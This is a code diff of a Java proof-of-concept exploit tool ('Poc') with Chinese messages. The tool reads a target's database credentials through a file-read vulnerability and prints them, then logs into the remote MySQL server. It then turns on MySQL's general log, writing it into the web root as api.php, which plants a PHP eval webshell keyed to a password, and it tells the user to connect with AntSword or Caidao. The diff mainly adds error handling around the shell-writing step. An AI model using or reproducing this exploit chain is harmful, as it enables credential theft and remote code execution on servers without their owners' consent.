@@ -8,6 +8,7 @@ import org.example.utils.OkHttpUtils;
 import java.net.*;
 import java.sql.Connection;
 import java.sql.ResultSet;
+import java.sql.SQLClientInfoException;
 import java.sql.Statement;
 import java.util.HashMap;
 import java.util.Map;
@@ -55,13 +56,14 @@ public class Poc {
         Matcher matcher = pattern.matcher(url);
         if (matcher.find()) {
             String host = matcher.group(1); // 提取主机部分 (IP或域名)
-            // 获取所有IP地址
-            InetAddress[] inetAddresses = InetAddress.getAllByName(host);
-            this.ip = String.valueOf(inetAddresses[0]).replace("/", "");
+            // 获取IP地址
+            InetAddress inetAddress = InetAddress.getByName(host);
+            String ipAddress = inetAddress.getHostAddress();
+            this.ip = String.valueOf(ipAddress).replace("/", "");
         }
     }
 
-    public boolean TestAlive() throws Exception{
+    public boolean TestAlive(){
         try {
             // 发送请求并获取响应
             Response response = OkHttpUtils.sendRequest(url);
@@ -104,16 +106,16 @@ public class Poc {
                 String value = matcher.group(2);  // 字段值 (localhost, root, etc.)
                 sqlMap.put(key,value);
             }
-            System.out.println("\033[33;1m[+]" +
-                               "Host:" + sqlMap.get("hostname") +
-                               ",Port:" + sqlMap.get("hostport") +
-                               ",Database:" + sqlMap.get("database") +
-                               ",Username:" + sqlMap.get("username") +
-                               ",Password:" + sqlMap.get("password") + "\033[0m");
             if (sqlMap.get("database") == null || sqlMap.get("username") == null ){
                 System.out.println("\033[31;1m[-]" + "目标不存在文件读取漏洞!" + "\033[0m");
                 return;
             }
+            System.out.println("\033[33;1m[+]" +
+                    "Host:" + sqlMap.get("hostname") +
+                    ",Port:" + sqlMap.get("hostport") +
+                    ",Database:" + sqlMap.get("database") +
+                    ",Username:" + sqlMap.get("username") +
+                    ",Password:" + sqlMap.get("password") + "\033[0m");
             Connection connection = MySQLUtils.TestConnect(this.ip,sqlMap.get("hostport"),sqlMap.get("database"),sqlMap.get("username"),sqlMap.get("password"));
             if (connection != null)
             {
@@ -138,24 +140,32 @@ public class Poc {
                         basedir = resultSet.getString(1);
                         System.out.println("\033[32;1m[+]" + "目标数据库根路径为: " + basedir + "\033[0m");
                     }
-                    String ShellPath = basedir.substring(0,basedir.indexOf("mysql")) + "www/public/api.php";
-                    sql = "set global general_log = on;";
-                    statement.execute(sql);
-                    sql = "set global general_log_file = '" +  ShellPath + "';";
-                    statement.execute(sql);
-                    sql = "select '<?php echo eval($_POST[\"" + ShellCmd +"\"]);?>';";
-                    statement.execute(sql);
-                    sql = "set global general_log = off;";
-                    statement.execute(sql);
-                    System.out.println("\033[32;1m[+]" + "目标网站Shell已经写入\033[0m");
-                    System.out.println("\033[32;1m[+]" + "使用蚁剑/菜刀连接:" + this.url + "api.php\tpassword:" + ShellCmd + "\033[0m");
-                    // 关闭连接
+                    try{
+                        String ShellPath = basedir.substring(0,basedir.indexOf("mysql")) + "www/public/api.php";
+                        sql = "set global general_log = on;";
+                        statement.execute(sql);
+                        sql = "set global general_log_file = '" +  ShellPath + "';";
+                        statement.execute(sql);
+                        sql = "select '<?php echo eval($_POST[\"" + ShellCmd +"\"]);?>';";
+                        statement.execute(sql);
+                        sql = "set global general_log = off;";
+                        statement.execute(sql);
+                        System.out.println("\033[32;1m[+]" + "目标网站Shell已经写入\033[0m");
+                        System.out.println("\033[32;1m[+]" + "使用蚁剑/菜刀连接:" + this.url + "api.php\tpassword:" + ShellCmd + "\033[0m");
+                    }catch (Exception e){
+                        System.out.println("\033[31;1m[-]" + "没有目标数据库的写入文件权限!" + "\033[0m");
+                    }
                 }else {
                     System.out.println("\033[34;1m[+]" + "目标数据库可远程连接!\033[0m");
                 }
                 connection.close();
             }
             else {
+                if (sqlMap.get("database") != null && sqlMap.get("username") != null && sqlMap.get("username") != null){
+                    System.out.println("\033[34;1m[-]" + "建议手工测试!" + "\033[0m");
+                    System.out.println("\033[34;1m[-]" + "TargetIP:" + this.ip + "\033[0m");
+                    return;
+                }
                 System.out.println("\033[31;1m[-]" + "目标数据库拒绝远程连接!" + "\033[0m");
             }
         }
